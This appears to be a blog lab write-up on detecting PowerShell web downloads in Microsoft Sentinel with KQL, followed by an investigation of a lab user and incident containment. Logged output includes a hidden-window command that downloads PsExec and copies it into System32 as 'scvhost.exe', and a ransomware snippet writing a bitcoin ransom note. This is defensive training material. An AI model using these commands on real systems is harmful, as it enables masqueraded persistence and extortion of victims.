---
title: "PowerShell Suspicious Web Request"
date: 2025-07-02
categories: [Blue Team, Incident Response]
tags: [windows, sentinel, azure, powershell, suspicious-activity, suspicious-webrequest]
---

# 🔍 Overview

> Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.
> When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet. 

## Tools Used
- **Cloud Platform:** Azure
- **SIEM:** Microsoft Sentinel
- **VM:** Windows 10
- **Application:** PowerShell

## Scenario 2: PowerShell Suspicious Web Request

Part 1: Create Alert Rule (PowerShell Suspicious Web Request)

```powershell
let TargetDevice = "threat-hunting-";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image.png)

...

```powershell
 threat-hunting-
 labuser99
 powershell -Command "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PsExec.zip' -OutFile 'C:\ProgramData\PsExec.zip'"
 powershell -Command "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PsExec.zip' -OutFile '$env:TEMP\PsExec.zip'"
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PsExec.zip' -OutFile 'C:\ProgramData\PsExec.zip'; Expand-Archive -Path 'C:\ProgramData\PsExec.zip' -DestinationPath 'C:\ProgramData\PsExec' -Force; Copy-Item -Path 'C:\ProgramData\PsExec\PsExec.exe' -Destination 'C:\Windows\System32\scvhost.exe' -Force"
 powershell -Command "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PsExec.zip' -OutFile "$env:TEMP\PsExec.zip""
```

There is a user named labuser99 in my VM!

Searching for Outbound Requests by labuser99

```powershell
DeviceNetworkEvents
| where InitiatingProcessAccountName == "labuser99"
| where RemoteIP != "" and RemoteIP !startswith "10." // Filter for outbound traffic
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, Protocol, ActionType
| order by Timestamp desc
```

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image11.png)

Checking if labuser99 is a domain account:

```powershell
DeviceLogonEvents
| where DeviceName == "threat-hunting-"
| where AccountName endswith "labuser99"
| summarize by AccountDomain, AccountName
```

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image12.png)

**Search for user impersonation or script execution using that identity**:

```powershell
DeviceProcessEvents
| where DeviceName == "threat-hunting-"
| where InitiatingProcessAccountName contains "labuser99"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessParentFileName
| order by Timestamp desc
```

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image13.png)

Checking if labuser99 deleted his account

```powershell
DeviceEvents
| where DeviceName == "threat-hunting-"
| where ActionType == "UserAccountDeleted"
| where AdditionalFields contains "labuser99"
| order by Timestamp desc
```

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image14.png)

Did not find the labuser99 user locally on the VM

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image15.png)

Didn’t find the files listed in the KQL Query results in the ProgramData folder:

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image16.png)

Finding labuser99’s execution of PsExec.zip

```powershell
DeviceProcessEvents
| where InitiatingProcessAccountName == "labuser99"
| where ProcessCommandLine has_any ("PsExec.zip", "PsExec.exe")
    or FileName has "PsExec"
| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image17.png)

> ⚠️ **Disclaimer:** All employee data, names, SSNs, phone numbers, and financial details used below are fictional and generated solely for simulation and training purposes.

...

# Write new decryption instructions in the Desktop folder
```powershell
"Your files have been encrypted.`nTo get the decryption key, send \$300 worth of bitcoin to [REDACTED-BTC-ADDRESS]" | Out-File -FilePath $decryptionInstructionsPath -Force
Log-Message "Decryption instructions written to: $decryptionInstructionsPath."
```

...

## Containment, Eradication, and Recovery

Machine was isolated in MDE and an anti-malware scan was run.

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image19.png)

## Post-Incident Activities

We had the affected user go through extra rounds of cybersecurity awareness training and upgraded our training package from KnowBe4 and increased training frequency.

Created a policy that restricts the use of PowerShell for non-essential users.

Updated Activity Log

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image20.png)

Close the Incident

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image21.png)

Delete the Detection Rule

![image.png](/assets/img/bluelabs/powershell-suspicious-webreq/image22.png)
